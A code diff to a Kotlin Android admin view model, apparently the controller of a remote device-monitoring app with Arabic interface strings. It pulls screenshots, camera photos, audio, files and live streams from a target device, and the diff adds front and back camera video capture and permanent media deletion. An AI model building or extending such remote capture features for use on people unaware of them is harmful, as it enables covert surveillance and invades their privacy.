@@ -74,14 +74,17 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
     val currentPath: StateFlow<String> = _currentPath.asStateFlow()
 
     // Media and responses states
-    private val _screenshot = MutableStateFlow<MediaItem?>(null)
-    val screenshot: StateFlow<MediaItem?> = _screenshot.asStateFlow()
+    private val _screenshots = MutableStateFlow<List<MediaItem>>(emptyList())
+    val screenshots: StateFlow<List<MediaItem>> = _screenshots.asStateFlow()
 
-    private val _cameraPhoto = MutableStateFlow<MediaItem?>(null)
-    val cameraPhoto: StateFlow<MediaItem?> = _cameraPhoto.asStateFlow()
+    private val _cameraPhotos = MutableStateFlow<List<MediaItem>>(emptyList())
+    val cameraPhotos: StateFlow<List<MediaItem>> = _cameraPhotos.asStateFlow()
 
-    private val _audioRecord = MutableStateFlow<MediaItem?>(null)
-    val audioRecord: StateFlow<MediaItem?> = _audioRecord.asStateFlow()
+    private val _cameraVideos = MutableStateFlow<List<MediaItem>>(emptyList())
+    val cameraVideos: StateFlow<List<MediaItem>> = _cameraVideos.asStateFlow()
+
+    private val _audioRecords = MutableStateFlow<List<MediaItem>>(emptyList())
+    val audioRecords: StateFlow<List<MediaItem>> = _audioRecords.asStateFlow()
 
     private val _commandResponse = MutableStateFlow<Pair<String, String>?>(null)
     val commandResponse: StateFlow<Pair<String, String>?> = _commandResponse.asStateFlow()
@@ -251,9 +254,9 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
         _installedApps.value = emptyList()
         _fileItems.value = emptyList()
         _currentPath.value = "/storage/emulated/0"
-        _screenshot.value = null
-        _cameraPhoto.value = null
-        _audioRecord.value = null
+        _screenshots.value = emptyList()
+        _cameraPhotos.value = emptyList()
+        _audioRecords.value = emptyList()
         _commandResponse.value = null
         _liveStreamState.value = null
         streamPollingJob?.cancel()
@@ -325,14 +328,14 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
         val files = connector.getFileSystem(token)
         _fileItems.value = files
 
-        // 4. Fetch Screenshot
-        _screenshot.value = connector.getScreenshot(token)
+        // 4. Fetch Screenshots
+        _screenshots.value = connector.getScreenshots(token)
 
-        // 5. Fetch Photo
-        _cameraPhoto.value = connector.getCameraPhoto(token)
+        // 5. Fetch Photos
+        _cameraPhotos.value = connector.getCameraPhotos(token)
 
-        // 6. Fetch Audio Record
-        _audioRecord.value = connector.getAudioRecord(token)
+        // 6. Fetch Audio Records
+        _audioRecords.value = connector.getAudioRecords(token)
 
         // 7. Get last command response
         _commandResponse.value = connector.getCommandResponse(token)
@@ -360,7 +363,13 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
     }
 
     private fun triggerAlertNotification() {
-        val context = getApplication<Application>().applicationContext
+        val baseContext = getApplication<Application>().applicationContext
+        val context = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            baseContext.createAttributionContext("supervisor_control")
+        } else {
+            baseContext
+        }
+        
         try {
             // 1. Sound BEEP
             ToneGenerator(AudioManager.STREAM_NOTIFICATION, 100)
@@ -389,6 +398,8 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
             "take_screenshot" -> "التقاط لقطة شاشة"
             "take_photo" -> "التقاط صورة كاميرا"
             "record_audio" -> "تسجيل صوتي"
+            "record_video_front" -> "تسجيل فيديو (أمامي)"
+            "record_video_back" -> "تسجيل فيديو (خلفي)"
             "list_apps" -> "جلب قائمة التطبيقات"
             "list_directory" -> "استعراض الملفات"
             else -> "تنفيذ الأمر ($commandType)"
@@ -407,9 +418,10 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
         val startTime = System.currentTimeMillis()
 
         // Before sending, record pre-state
-        val preScreenshotTime = _screenshot.value?.timestamp ?: 0L
-        val prePhotoTime = _cameraPhoto.value?.timestamp ?: 0L
-        val preAudioTime = _audioRecord.value?.timestamp ?: 0L
+        val preScreenshotTime = _screenshots.value.firstOrNull()?.timestamp ?: 0L
+        val prePhotoTime = _cameraPhotos.value.firstOrNull()?.timestamp ?: 0L
+        val preAudioTime = _audioRecords.value.firstOrNull()?.timestamp ?: 0L
+        val preVideoTime = _cameraVideos.value.firstOrNull()?.timestamp ?: 0L
 
         _activeCommandProgress.value = ActiveCommandProgress(
             commandType = commandType,
@@ -476,7 +488,7 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                 // Inspect if the command was executed by looking at updated states
                 when (commandType) {
                     "take_screenshot" -> {
-                        val currentScreenshot = _screenshot.value
+                        val currentScreenshot = _screenshots.value.firstOrNull()
                         if (currentScreenshot != null && currentScreenshot.timestamp > preScreenshotTime) {
                             executedSuccessfully = true
                             _activeCommandProgress.value = _activeCommandProgress.value?.copy(
@@ -485,7 +497,7 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                         }
                     }
                     "take_photo" -> {
-                        val currentPhoto = _cameraPhoto.value
+                        val currentPhoto = _cameraPhotos.value.firstOrNull()
                         if (currentPhoto != null && currentPhoto.timestamp > prePhotoTime) {
                             executedSuccessfully = true
                             _activeCommandProgress.value = _activeCommandProgress.value?.copy(
@@ -494,11 +506,20 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                         }
                     }
                     "record_audio" -> {
-                        val currentAudio = _audioRecord.value
+                        val currentAudio = _audioRecords.value.firstOrNull()
                         if (currentAudio != null && currentAudio.timestamp > preAudioTime) {
                             executedSuccessfully = true
                             _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                                 responseData = currentAudio
+                            )
+                        }
+                    }
+                    "record_video_front", "record_video_back" -> {
+                        val currentVideo = _cameraVideos.value.firstOrNull()
+                        if (currentVideo != null && currentVideo.timestamp > preVideoTime) {
+                            executedSuccessfully = true
+                            _activeCommandProgress.value = _activeCommandProgress.value?.copy(
+                                responseData = currentVideo
                             )
                         }
                     }
@@ -548,17 +569,17 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                 // Play sound or show directly on screen
                 when (commandType) {
                     "record_audio" -> {
-                        _audioRecord.value?.base64?.let { base64Audio ->
+                        _audioRecords.value.firstOrNull()?.base64?.let { base64Audio ->
                             loadAndPlayAudio(base64Audio)
                         }
                     }
                     "take_screenshot" -> {
-                        _screenshot.value?.let { screenshotMedia ->
+                        _screenshots.value.firstOrNull()?.let { screenshotMedia ->
                             _directScreenshotToShow.value = screenshotMedia
                         }
                     }
                     "take_photo" -> {
-                        _cameraPhoto.value?.let { photoMedia ->
+                        _cameraPhotos.value.firstOrNull()?.let { photoMedia ->
                             _directPhotoToShow.value = photoMedia
                         }
                     }
@@ -589,6 +610,11 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
         ))
     }
 
+    fun requestVideo(isFront: Boolean) {
+        val command = if (isFront) "record_video_front" else "record_video_back"
+        runCommand(command)
+    }
+
     fun requestAudioRecord() {
         runCommand("record_audio")
     }
@@ -615,7 +641,13 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
 
     // AUDIO PLAYBACK MANAGEMENT
     fun loadAndPlayAudio(base64Data: String) {
-        val context = getApplication<Application>().applicationContext
+        val baseContext = getApplication<Application>().applicationContext
+        val context = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            baseContext.createAttributionContext("supervisor_control")
+        } else {
+            baseContext
+        }
+
         viewModelScope.launch {
             try {
                 stopAudio()
@@ -737,9 +769,28 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
     }
 
     fun stopLiveStream() {
+        val token = _selectedDeviceToken.value ?: return
         runCommand("stop_stream")
         streamPollingJob?.cancel()
         _liveStreamState.value = _liveStreamState.value?.copy(isActive = false)
+    }
+
+    fun deleteMediaItem(category: String, itemId: String) {
+        val token = _selectedDeviceToken.value ?: return
+        viewModelScope.launch {
+            val success = connector.deleteMediaItem(token, category, itemId)
+            if (success) {
+                _statusMessage.value = "تم حذف الملف نهائياً من قاعدة البيانات"
+                // Refresh list
+                when (category) {
+                    "screenshots" -> _screenshots.value = connector.getScreenshots(token)
+                    "camera_photos" -> _cameraPhotos.value = connector.getCameraPhotos(token)
+                    "audio_records" -> _audioRecords.value = connector.getAudioRecords(token)
+                }
+            } else {
+                _statusMessage.value = "فشل حذف الملف، حاول مرة أخرى"
+            }
+        }
     }
 
     override fun onCleared() {
